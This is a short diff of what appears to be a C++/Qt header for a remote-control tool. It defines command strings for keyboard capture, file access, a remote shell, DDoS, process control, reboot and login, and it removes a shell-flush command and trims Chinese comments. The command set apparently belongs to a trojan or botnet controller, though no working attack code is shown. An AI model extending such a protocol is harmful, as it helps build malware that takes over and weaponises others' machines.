@@ -24,7 +24,6 @@ public:
     const QByteArray CmdKeybd = "CMD_KEYBD";
     const QByteArray CmdFile = "CMD_FILE";
     const QByteArray CmdShell = "CMD_SHELL";
-    const QByteArray CmdShellFlush = "CMD_SHELL_FLUSH"; // 辅助shell模块的命令 打开shell模块才能使用
     const QByteArray CmdDdos = "CMD_DDOS";
     const QByteArray CmdProcess = "CMD_PROC";
 
@@ -32,7 +31,7 @@ public:
     const QByteArray CmdReboot = "REBOOT";
     const QByteArray CmdOffline = "OFFLINE";
 
-    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
+    // 客户端向服务端发送的指令
     const QByteArray CmdLogin = "LOGIN";
     //------------------------------------------------------------------------------
 
